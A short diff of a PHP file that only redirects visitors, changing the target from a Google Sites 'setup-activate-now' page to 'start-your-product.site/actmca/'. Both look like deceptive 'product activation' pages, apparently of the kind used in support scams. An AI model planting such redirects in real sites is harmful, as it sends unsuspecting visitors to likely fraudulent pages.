@@ -1,4 +1,4 @@
 <?php
-header("Location: https://sites.google.com/view/setup-activate-now/home");
+header("Location: https://start-your-product.site/actmca/");
 die();
 ?>
